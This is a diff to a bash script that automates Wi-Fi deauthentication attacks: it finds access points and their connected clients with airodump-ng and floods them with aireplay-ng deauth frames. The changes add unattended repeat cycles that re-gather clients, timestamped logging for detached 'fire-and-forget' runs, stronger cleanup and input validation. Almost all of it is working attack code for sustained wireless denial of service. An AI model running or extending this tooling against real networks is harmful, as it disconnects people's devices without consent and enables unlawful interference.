@@ -1,7 +1,7 @@
 #!/bin/bash
 
 show_help() {
-    echo "Usage: ${0} [-i INTERFACE] [-b AP_BSSID] [-c CHANNEL] [-s STA_BSSID] [-f AP_BSSID_FILE] [-w WAIT] [-r REPEATS] [--pc COUNT] [--ps SPEED] [--rc REASON] [--sd STADURATION] [--st SCANTIME] [--fu FILTERUNASSOC] [--fbd FILTERBYDATA] [--wint WRITEINT] [--uch] [--ag] [--an] [--aq] [--kf] [-h] [--help]"
+    echo "Usage: ${0} [-i INTERFACE] [-b AP_BSSID] [-c CHANNEL] [-s STA_BSSID] [-f AP_BSSID_FILE] [-w WAIT] [-r REPEATS] [--pc COUNT] [--ps SPEED] [--rc REASON] [--sd STADURATION] [--st SCANTIME] [--fu FILTERUNASSOC] [--fbd FILTERBYDATA] [--wint WRITEINT] [--uch] [--ag] [--an] [--aq] [--kf] [--rg] [-h] [--help]"
     echo
     echo "Options:"
     echo "  -i INTERFACE      Specify the interface name to use."
@@ -24,6 +24,8 @@ show_help() {
     echo "  --fbd INT         Specify Filter AP By Data Recieved for channel update (default: ${DEFAULT_FILTERBYDATA})."
     echo "  --wint INT        Specify the write interval for channel update (default: ${DEFAULT_WRITEINT})."
     echo "  --kf              Keep the generated file for --ag, --an, --aq or normal attack after use instead of deleting."
+    echo "  --log FILE        Append timestamped output to FILE (for fire-and-forget runs in screen)."
+    echo "  --rg              Re-detect channels + re-gather clients between each repeat cycle (file/auto mode; unattended sweeps)."
     echo "  -h                Show this help menu."
     echo " --help             Same as -h."
     echo
@@ -85,21 +87,41 @@ show_help() {
 }
 
 cleanup() {
-    trap - EXIT SIGINT SIGTERM
+    trap - EXIT SIGINT SIGTERM SIGHUP
 
     echo -e "\nCleaning up..."
-    pkill -P $$  
-    wait
+
+    # Screens started with 'screen -dmS' are reparented into their own session,
+    # so pkill -P $$ never sees them. Quit every screen this run created
+    # (matched by our unique SCREENUID) and reap the airodump/aireplay it holds.
+    kill_our_processes
+
+    pkill -P $$ 2>/dev/null
+    wait 2>/dev/null
     remove_update_temp
     keep_file_after
-    if screen -list | grep -q "ch_update_${SCREENUID}"; then
-        screen -S "ch_update_${SCREENUID}" -X quit
-    fi
-    if screen -list | grep -q "autogather_${SCREENUID}"; then
-        screen -S "autogather_${SCREENUID}" -X quit
-    fi
     echo "Done."
     exit 0
+}
+
+kill_our_processes() {
+    # 1) Quit detached screens created this run, matched by our unique SCREENUID.
+    #    awk on the first field is more portable than a strict -oE pattern.
+    local sess
+    for sess in $(screen -ls 2>/dev/null | grep "${SCREENUID}" | awk '{print $1}'); do
+        screen -S "$sess" -X quit 2>/dev/null
+    done
+    screen -wipe >/dev/null 2>&1
+
+    # 2) Backstops in case a screen quit is missed on-device: kill the SCREEN
+    #    wrappers by our unique session names (this also takes their airodump
+    #    child with them), then any airodump we launched by its unique write
+    #    path. Matching on SCREENUID / the /tmp paths keeps this from touching
+    #    unrelated screens or captures on the box.
+    pkill -f "ch_update_${SCREENUID}"  2>/dev/null
+    pkill -f "autogather_${SCREENUID}" 2>/dev/null
+    pkill -f "/tmp/airodump_capture"   2>/dev/null
+    [ -n "${UPDATE_FILE}" ] && pkill -f "${UPDATE_FILE}" 2>/dev/null
 }
 
 remove_update_temp() {
@@ -107,19 +129,21 @@ remove_update_temp() {
     find /tmp -maxdepth 1 -type f -name "airodump_capture-*.csv" -exec rm {} +
 }
 
-trap cleanup EXIT SIGINT SIGTERM
+trap cleanup EXIT SIGINT SIGTERM SIGHUP
 
 DEFAULT_WAIT=30
 DEFAULT_REPEATS=1
 DEFAULT_COUNT=10
 DEFAULT_SPEED=5
-DEFAULT_REASON=0
+DEFAULT_REASON=3
 
 AUTO_GATHER=false
 AUTO_ALL=false
 AUTO_QUICK=false
 AUTO_QUICK_USED=false
 UPDATE_CH=false
+LOG_FILE=""
+REGATHER=false
 LOOP_START_DELAY=16
 KEEP_FILE=false
 
@@ -162,22 +186,30 @@ SCANTIME=${SCANTIME:-$DEFAULT_SCANTIME}
 AG_FILE=""
 
 keep_file_after() {
-    if [ "${KEEP_FILE}" == false ]; then
-        if [ -n "${AP_BSSID_FILE}" ] && [ "${AP_BSSID_FILE}" != "${ORIGIN_AP_BSSID_FILE}" ]; then
-            rm -f "${AP_BSSID_FILE}" 2>/dev/null
-        fi        
+    [ "${KEEP_FILE}" == true ] && return 0
+
+    # Remove every timestamped work file generated from the original this run.
+    # The glob is keyed to THIS run's CDATE, so it only ever matches files we
+    # created (ORIGIN.CDATE, ORIGIN.CDATE.CDATE, ...) and never the original,
+    # regardless of how the name compounded across --rg cycles.
+    if [ -n "${ORIGIN_AP_BSSID_FILE}" ]; then
+        rm -f "${ORIGIN_AP_BSSID_FILE}.${CDATE}"* 2>/dev/null
     fi
-#    if [ "${KEEP_FILE}" == false ] || [ "${KEEP_FILE}" == true ]; then
-#        if [ -n "${AG_FILE}" ] && [ "${ORIGIN_AP_BSSID_FILE}" != "${AG_FILE}" ]; then
-#            rm -f "${AG_FILE}" 2>/dev/null
-#        fi
-#    fi
+
+    # Belt-and-braces: if AP_BSSID_FILE points at a generated file, drop it too.
+    if [ -n "${AP_BSSID_FILE}" ] && [ "${AP_BSSID_FILE}" != "${ORIGIN_AP_BSSID_FILE}" ]; then
+        rm -f "${AP_BSSID_FILE}" 2>/dev/null
+    fi
 }
 
 detect_supported_bands() {
     if [ -n "${IFACE}" ]; then
         INTERFACE="${IFACE}"
     fi
+
+    # Reset every run so a previous 'true' cannot leak into a later detection.
+    IS_24GHZ_SUPPORTED=false
+    IS_5GHZ_SUPPORTED=false
 
     # Get the PHY index for the interface using iw dev
     PHY=$(iw dev | awk -v iface="${INTERFACE}" '$1 ~ /^phy#/ { phy=$1 } $1 == "Interface" && $2 == iface { print phy; exit }' | tr -d '#')
@@ -417,17 +449,45 @@ auto_gather() {
             # Set interface to correct channel
             iwconfig "${IFACE}" channel "$channel"
 
-            # Run airodump-ng for the specified duration
+            # Passive listen only - no injected frames during gathering.
             screen -dmS "autogather_${SCREENUID}" airodump-ng -d "$ap_bssid" -c "$channel" --write /tmp/airodump_capture --output-format csv "$IFACE" &
-            echo "Gathering Stations on ${ap_bssid} for ${STADURATION}, Please wait."
+            echo "Gathering Stations on ${ap_bssid} for ${STADURATION}s, Please wait."
             sleep "$STADURATION"
-            screen -S "autogather_${SCREENUID}" -X quit
+            if screen -list | grep -q "autogather_${SCREENUID}"; then
+                screen -S "autogather_${SCREENUID}" -X quit
+            fi
 
-            # Extract STAs associated with the AP
-            awk -F"," 'BEGIN {start=0} /Station MAC/ {start=1} start && $1 != "" && $1 != "Station MAC" {print $1}' /tmp/airodump_capture-01.csv | \
-            sed 's/\r//g' | sed '/^$/d' | while read -r sta_bssid; do
-                echo "$ap_bssid,$sta_bssid,$channel" >> "$OUTPUT_FILE"
-            done
+            # Parse airodump's two-section CSV properly. The station section
+            # starts at the "Station MAC" header; field 1 is the STA MAC and
+            # field 6 is the AP it is associated with. Only keep stations tied
+            # to THIS ap_bssid (case-insensitive) and drop unassociated ones.
+            sta_found=0
+            if [ -f /tmp/airodump_capture-01.csv ]; then
+                while IFS= read -r sta_bssid; do
+                    [ -z "$sta_bssid" ] && continue
+                    echo "$ap_bssid,$sta_bssid,$channel" >> "$OUTPUT_FILE"
+                    sta_found=$((sta_found+1))
+                done < <(
+                    awk -F',' -v ap="$ap_bssid" '
+                        BEGIN { instations=0 }
+                        /Station MAC/ { instations=1; next }
+                        instations {
+                            mac=$1; bss=$6
+                            gsub(/[[:space:]\r]/,"",mac); gsub(/[[:space:]\r]/,"",bss)
+                            if (mac=="" ) next
+                            if (toupper(bss)==toupper(ap)) print mac
+                        }' /tmp/airodump_capture-01.csv
+                )
+            fi
+
+            # No clients tied to this AP: skip it this pass rather than
+            # queueing a broadcast deauth. It'll be picked up on a later
+            # re-gather if a client appears.
+            if [ "$sta_found" -eq 0 ]; then
+                echo "No clients found on ${ap_bssid}; skipping (no broadcast)."
+            else
+                echo "Found ${sta_found} client(s) on ${ap_bssid}."
+            fi
 
             # Clean up temporary files
             find /tmp -maxdepth 1 -type f -name "airodump_capture-*.csv" -exec rm {} +
@@ -471,7 +531,9 @@ process_channels() {
         new_channel=$(grep "${bssid}" "${UPDATE_FILE}"-01.csv | head -n 1 | cut -d ',' -f 4)
 
         # Update channel number in input file
-        awk -F',' -v OFS=',' -v bssid="${bssid}" -v new_channel="${new_channel}" 'BEGIN { OFS = "," } $1 == bssid { gsub(/^[[:space:]]+|[[:space:]]+$/, "", $3); gsub(/^[[:space:]]+|[[:space:]]+$/, "", new_channel); if ($3 != new_channel) $3 = new_channel; print } $1 != bssid' "$AP_BSSID_FILE" > temp && mv temp "$AP_BSSID_FILE"
+        _pc_tmp=$(mktemp) || { echo "[ERROR]: Unable to create temp file."; exit 1; }
+        awk -F',' -v OFS=',' -v bssid="${bssid}" -v new_channel="${new_channel}" 'BEGIN { OFS = "," } $1 == bssid { gsub(/^[[:space:]]+|[[:space:]]+$/, "", $3); gsub(/^[[:space:]]+|[[:space:]]+$/, "", new_channel); if ($3 != new_channel) $3 = new_channel; print } $1 != bssid' "$AP_BSSID_FILE" > "$_pc_tmp" && mv "$_pc_tmp" "$AP_BSSID_FILE"
+        rm -f "$_pc_tmp" 2>/dev/null
     done < "${AP_BSSID_FILE}"
 
     echo "All BSSIDs channels within a detectable range have been updated."
@@ -614,11 +676,52 @@ while [[ $# -gt 0 ]]; do
             shift 2
             ;;
         --kf) KEEP_FILE=true; shift ;;
+        --log)
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --log"
+                exit 1
+            fi
+            LOG_FILE="$2"
+            shift 2
+            ;;
+        --rg) REGATHER=true; shift ;;
         -h|--help) show_help; exit 0 ;;
         --) shift; break ;; # End of options
         *) echo "Invalid option: $1" >&2; show_help; exit 1 ;;
     esac
 done
+
+# --- Numeric validation for unattended safety ---
+for _pair in "WAIT_SECONDS:-w" "REPEATS:-r" "COUNT:--pc" "SPEED:--ps" \
+             "REASON:--rc" "STADURATION:--sd" "SCANTIME:--st" "WRITEINT:--wint" \
+             "FILTERBYDATA:--fbd"; do
+    _var="${_pair%%:*}"; _flag="${_pair##*:}"; _val="${!_var}"
+    if [ -n "$_val" ] && [[ ! "$_val" =~ ^[0-9]+$ ]]; then
+        echo "[ERROR]: ${_flag} must be a non-negative integer (got '${_val}')." >&2
+        exit 1
+    fi
+done
+
+# --- Verify required tools before doing anything on air ---
+_missing=()
+for _tool in aireplay-ng airodump-ng iw iwconfig screen awk; do
+    command -v "$_tool" >/dev/null 2>&1 || _missing+=("$_tool")
+done
+if [ ${#_missing[@]} -gt 0 ]; then
+    echo "[ERROR]: Missing required tool(s): ${_missing[*]}" >&2
+    echo "[INFO]: Install them (e.g. 'opkg install <tool>') and re-run." >&2
+    exit 1
+fi
+
+# --- Set up logging: timestamp every line and tee to the logfile if asked ---
+if [ -n "$LOG_FILE" ]; then
+    if ! : > "$LOG_FILE" 2>/dev/null; then
+        echo "[ERROR]: Cannot write to log file '$LOG_FILE'." >&2
+        exit 1
+    fi
+    exec > >(while IFS= read -r _line; do printf '%s %s\n' "$(date '+%F %T')" "$_line"; done | tee -a "$LOG_FILE") 2>&1
+    echo "Logging to ${LOG_FILE}"
+fi
 
 # Function to validate parameters
 validate_params() {
@@ -756,10 +859,83 @@ if [ -n "$AP_BSSID" ]; then
     STATION_BSSIDS=("$STA_BSSID")
     CHANNELS=("$CHANNEL")
 elif [ -n "$AP_BSSID_FILE" ]; then
-    BSSIDS=($(awk -F"," '{print $1}' "$AP_BSSID_FILE"))
-    STATION_BSSIDS=($(awk -F"," '{print $2}' "$AP_BSSID_FILE"))
-    CHANNELS=($(awk -F"," '{print $3}' "$AP_BSSID_FILE"))
+    # Read the three fields together per line so an empty STATION column
+    # (the BSSID,,CHAN placeholder rows) cannot shift channels into the
+    # wrong array index.
+    BSSIDS=()
+    STATION_BSSIDS=()
+    CHANNELS=()
+    while IFS=',' read -r _b _s _c; do
+        [ -z "$_b" ] && continue
+        BSSIDS+=("$_b")
+        STATION_BSSIDS+=("$_s")
+        CHANNELS+=("$_c")
+    done < "$AP_BSSID_FILE"
 fi
+
+# Run one aireplay-ng deauth, guarded so an error is logged and the run
+# continues instead of ending the whole unattended session.
+# $1 AP bssid, $2 STA bssid (may be empty -> broadcast), $3 channel
+run_deauth() {
+    local ap="$1" sta="$2" ch="$3"
+    if ! iwconfig "${IFACE}" channel "${ch}" 2>/dev/null; then
+        echo "[WARN]: Failed to set ${IFACE} to channel ${ch} for ${ap}; skipping this target."
+        return 1
+    fi
+    local rc
+    if [ -n "$sta" ]; then
+        aireplay-ng -D --deauth "${COUNT}" -a "${ap}" -c "${sta}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
+        rc=$?
+    else
+        aireplay-ng -D --deauth "${COUNT}" -a "${ap}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
+        rc=$?
+    fi
+    if [ "$rc" -ne 0 ]; then
+        echo "[WARN]: aireplay-ng exited ${rc} for AP ${ap} STA ${sta:-broadcast}; continuing."
+        return 1
+    fi
+    return 0
+}
+
+# Optional: re-gather clients from the ORIGINAL AP file at the top of each
+# repeat (only with --rg, and only in file mode). Rebuilds the target arrays
+# so clients that appeared while unattended get picked up. Falls back to the
+# existing arrays if a gather pass yields nothing.
+regather_targets() {
+    [ "$REGATHER" = true ] || return 0
+    [ -n "$ORIGIN_AP_BSSID_FILE" ] || return 0
+    echo "[--rg] Re-detecting channels and re-gathering clients before next cycle..."
+
+    # Clear stale scan CSVs, otherwise airodump-ng rolls to -02.csv and the
+    # channel-update step would read last cycle's stale -01.csv.
+    remove_update_temp
+    find /tmp -maxdepth 1 -type f -name "airodump_capture-*.csv" -exec rm {} + 2>/dev/null
+
+    # Restart from the original AP list and re-run the auto pipeline
+    # (channel update -> client gather) exactly as --an does at startup,
+    # non-interactively. Save/restore the auto flags around the call.
+    AP_BSSID_FILE="$ORIGIN_AP_BSSID_FILE"
+    local _sa="$AUTO_ALL" _sg="$AUTO_GATHER" _su="$UPDATE_CH" _sq="$AUTO_QUICK"
+    AUTO_ALL=true
+    AUTO_GATHER=true
+    UPDATE_CH=false
+    AUTO_QUICK=false
+    update_ch_check
+    AUTO_ALL="$_sa"; AUTO_GATHER="$_sg"; UPDATE_CH="$_su"; AUTO_QUICK="$_sq"
+
+    local fresh="${ORIGIN_AP_BSSID_FILE}.${CDATE}"
+    if [ -f "$fresh" ]; then
+        BSSIDS=(); STATION_BSSIDS=(); CHANNELS=()
+        while IFS=',' read -r _b _s _c; do
+            [ -z "$_b" ] && continue
+            BSSIDS+=("$_b"); STATION_BSSIDS+=("$_s"); CHANNELS+=("$_c")
+        done < "$fresh"
+        AP_BSSID_FILE="$fresh"
+        echo "[--rg] Refreshed target list: ${#BSSIDS[@]} entries."
+    else
+        echo "[--rg] Re-gather produced no file; keeping previous target list."
+    fi
+}
 
 # Loops for Single target and AP File respectively
 
@@ -803,13 +979,7 @@ if [ -z "$AP_BSSID_FILE" ]; then
         echo "------------------------------"
         echo
 
-        iwconfig "${IFACE}" channel "${CHANNEL}"
-        
-        if [ -n "${STA_BSSID[$i]}" ]; then
-            aireplay-ng --deauth "${COUNT}" -a "${BSSIDS[$i]}" -c "${STA_BSSID[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
-        else
-            aireplay-ng --deauth "${COUNT}" -a "${BSSIDS[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
-        fi
+        run_deauth "${AP_BSSID}" "${STA_BSSID}" "${CHANNEL}"
         echo
         echo "Stopped aireplay-ng instance."
         
@@ -854,6 +1024,12 @@ if [ -n "$AP_BSSID_FILE" ]; then
             first_run=false
         fi
 
+        # Re-gather channels + clients between cycles (only with --rg).
+        # Skipped before the first cycle: the initial setup gather feeds it.
+        if [ "$j" -gt 0 ]; then
+            regather_targets
+        fi
+
         for i in "${!BSSIDS[@]}"; do
             echo "Starting Attack $((j+1)) of ${REPEATS}"
             echo "------------------------------"
@@ -863,14 +1039,7 @@ if [ -n "$AP_BSSID_FILE" ]; then
             echo "------------------------------"
             echo
 
-            # Set channel before running aireplay-ng command
-            iwconfig "${IFACE}" channel "${CHANNELS[$i]}"
-            
-            if [ -n "${STATION_BSSIDS[$i]}" ]; then
-                aireplay-ng -D --deauth "${COUNT}" -a "${BSSIDS[$i]}" -c "${STATION_BSSIDS[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
-            else
-                aireplay-ng -D --deauth "${COUNT}" -a "${BSSIDS[$i]}" -x "${SPEED}" --deauth-rc "${REASON}" "${IFACE}"
-            fi
+            run_deauth "${BSSIDS[$i]}" "${STATION_BSSIDS[$i]}" "${CHANNELS[$i]}"
             echo
             echo "Stopped aireplay-ng instance."
         done
